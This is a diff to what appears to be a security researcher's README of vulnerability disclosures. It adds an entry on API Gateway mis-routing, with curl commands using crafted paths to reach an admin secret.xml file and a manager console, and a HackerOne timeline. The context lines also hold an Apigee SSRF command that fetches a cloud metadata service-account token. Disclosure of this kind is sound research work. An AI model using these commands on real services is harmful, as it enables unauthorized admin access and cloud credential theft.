@@ -1,5 +1,25 @@
 # cve
 
+## 0x0D CVE-/-/ - Mis-routing in a top 5 Cloud Api Gateway service is a **Intended Behavior**?
+
+**1-Line curl**, unauthenticated attacker could manipulate **Api Gateway Api-Routing to Full Application and Cloud Asset Takeover**
+
+```bash
+curl -i --path-as-is "https://<XXX>.execute-api.us-west-2.amazonaws.com/prod/public-api/health/<CRAFTED_URI>/<admin-api>/conf/secret.xml"
+```
+
+**WHAT HE CAN DO?**
+
+```bash
+curl -i --path-as-is "https://<XXX>.execute-api.us-west-2.amazonaws.com/prod/public-api/health/<CRAFTED_URI>/manager/html/"
+# → SC 200
+```
+
+|Date|Status|Comment|
+|:--:|:--:|:--:|
+|Sep 16, 2025|Private|Reported to ****** Cloud Security Team via HackerOne|
+|Sep 30, 2025|Private|Marked as 'Informative(Closed)'|
+
 ## 0x0C CVE-/-/ - Mis-routing in a top 5 Cloud Apigee service is a **Intended Behavior**?
 
 **1-Line curl**, unauthenticated attacker could manipulate **Cloud Apigee Api-Routing to Full Application and Cloud Asset Takeover**
@@ -7,6 +27,7 @@
 ```bash
 curl "https://<vulnerable-apigee-service>/<public-api>/<crafted-uri>/<admin-api>/diag-curl?url=http://metadata.******.internal/computeMetadata/v1/instance/service-accounts/default/token"
 ```
+
 **WHAT HE CAN DO?**
 
 ```bash
